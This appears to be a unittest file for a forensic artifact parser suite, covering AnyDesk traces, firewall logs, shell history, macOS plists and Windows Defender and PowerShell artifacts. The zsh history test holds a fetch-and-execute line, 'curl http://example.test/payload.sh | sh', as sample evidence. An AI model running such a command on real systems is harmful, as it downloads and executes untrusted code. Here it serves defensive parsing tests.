import os
import plistlib
import sys
import tarfile
import tempfile
import types
import unittest
import importlib.util

utils_package = types.ModuleType('utils')
timezone_module = types.ModuleType('utils.timezone')
timezone_module.get_source_tz_for_artifact = lambda _artifact_type, case_tz='UTC': case_tz or 'UTC'
sys.modules.setdefault('utils', utils_package)
sys.modules.setdefault('utils.timezone', timezone_module)

from parsers.av_artifact_parsers import DefenderDetectionHistoryParser, MpLogParser
from parsers.linux_parsers import LinuxShellHistoryParser
from parsers.macos_parsers import MacPlistParser
from parsers.registry import ParserRegistry
from parsers.rmm_parsers import AnyDeskTraceParser
from parsers.windows_artifact_parsers import PcaParser, PowerShellTranscriptParser
from parsers.log_parsers import FirewallLogParser
archive_spec = importlib.util.spec_from_file_location(
    'archive_extraction_for_gap_test',
    os.path.join(os.path.dirname(os.path.dirname(__file__)), 'utils', 'archive_extraction.py'),
)
archive_module = importlib.util.module_from_spec(archive_spec)
archive_spec.loader.exec_module(archive_module)
extract_zip_archive = archive_module.extract_zip_archive


class ParserGapCoverageTestCase(unittest.TestCase):
    def test_new_gap_parsers_are_registered(self):
        registry = ParserRegistry()
        parsers = registry.list_parsers()
        for artifact_type in (
            'sum',
            'rmm_anydesk',
            'defender_detectionhistory',
            'pca_execution',
            'linux_shell_history',
            'macos_plist',
            'rdp_bitmap_cache',
            'windows_server_log',
        ):
            self.assertIn(artifact_type, parsers)

    def test_anydesk_trace_parser_extracts_remote_ip(self):
        with tempfile.NamedTemporaryFile('w', suffix='ad.trace', delete=False) as handle:
            handle.write('2026-06-12 10:11:12 Incoming session connected from 203.0.113.10\n')
            path = handle.name
        self.addCleanup(lambda: os.path.exists(path) and os.unlink(path))

        events = list(AnyDeskTraceParser(case_id=1).parse(path))
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'rmm_anydesk')
        self.assertEqual(events[0].src_ip, '203.0.113.10')

    def test_pfirewall_w3c_fields_map_to_network_columns(self):
        parser = FirewallLogParser(case_id=1)
        with tempfile.NamedTemporaryFile('w', suffix='pfirewall.log', delete=False) as handle:
            handle.write('#Fields: date time action protocol src-ip dst-ip src-port dst-port\n')
            handle.write('2026-06-12 10:11:12 ALLOW TCP 192.0.2.1 198.51.100.2 4444 443\n')
            path = handle.name
        self.addCleanup(lambda: os.path.exists(path) and os.unlink(path))

        events = list(parser.parse(path))
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].src_ip, '192.0.2.1')
        self.assertEqual(events[0].dst_ip, '198.51.100.2')
        self.assertEqual(events[0].src_port, 4444)
        self.assertEqual(events[0].dst_port, 443)

    def test_linux_shell_history_zsh_extended_timestamp(self):
        with tempfile.NamedTemporaryFile('w', suffix='.zsh_history', delete=False) as handle:
            handle.write(': 1781287872:0;curl http://example.test/payload.sh | sh\n')
            path = handle.name
        self.addCleanup(lambda: os.path.exists(path) and os.unlink(path))

        events = list(LinuxShellHistoryParser(case_id=1).parse(path))
        self.assertEqual(events[0].command_line, 'curl http://example.test/payload.sh | sh')
        self.assertEqual(events[0].timestamp_source_tz, 'UTC')

    def test_macos_launchagent_plist_is_persistence_event(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            launch_dir = os.path.join(temp_dir, 'Library', 'LaunchAgents')
            os.makedirs(launch_dir)
            path = os.path.join(launch_dir, 'com.example.agent.plist')
            with open(path, 'wb') as handle:
                plistlib.dump({'Label': 'com.example.agent', 'ProgramArguments': ['/tmp/a']}, handle)

            events = list(MacPlistParser(case_id=1).parse(path))
            self.assertEqual(events[0].event_id, 'macos_launchd_plist')
            self.assertIn('/tmp/a', events[0].search_blob)

    def test_tar_archives_extract_through_existing_helper(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            src_file = os.path.join(temp_dir, 'auth.log')
            with open(src_file, 'w') as handle:
                handle.write('Jun 12 10:11:12 host sshd[1]: Accepted password for alice from 192.0.2.10\n')
            archive_path = os.path.join(temp_dir, 'uac.tar.gz')
            with tarfile.open(archive_path, 'w:gz') as archive:
                archive.add(src_file, arcname='var/log/auth.log')
            extract_dir = os.path.join(temp_dir, 'extract')
            os.makedirs(extract_dir)

            details = extract_zip_archive(archive_path, extract_dir)
            self.assertEqual(details['extraction_method'], 'python_tarfile')
            self.assertTrue(os.path.exists(os.path.join(extract_dir, 'var', 'log', 'auth.log')))

    def test_defender_and_windows_execution_parsers_accept_expected_files(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            det_dir = os.path.join(temp_dir, 'DetectionHistory')
            os.makedirs(det_dir)
            det_path = os.path.join(det_dir, 'record.bin')
            with open(det_path, 'wb') as handle:
                handle.write(b'Threat:Trojan:Win32/Test\x00C:\\bad.exe\x00')
            self.assertTrue(DefenderDetectionHistoryParser(case_id=1).can_parse(det_path))

            mplog = os.path.join(temp_dir, 'MPLog-123.log')
            with open(mplog, 'w') as handle:
                handle.write('2026-06-12 10:11:12 Threat quarantined\n')
            self.assertTrue(MpLogParser(case_id=1).can_parse(mplog))

            pca_dir = os.path.join(temp_dir, 'Windows', 'appcompat', 'pca')
            os.makedirs(pca_dir)
            pca = os.path.join(pca_dir, 'PcaAppLaunchDic.txt')
            with open(pca, 'w') as handle:
                handle.write('C:\\Tools\\a.exe|2026-06-12 10:11:12\n')
            self.assertTrue(PcaParser(case_id=1).can_parse(pca))

            transcript = os.path.join(temp_dir, 'PowerShell_transcript.HOST.1.txt')
            with open(transcript, 'w') as handle:
                handle.write('PS> whoami\n')
            self.assertTrue(PowerShellTranscriptParser(case_id=1).can_parse(transcript))


if __name__ == '__main__':
    unittest.main()
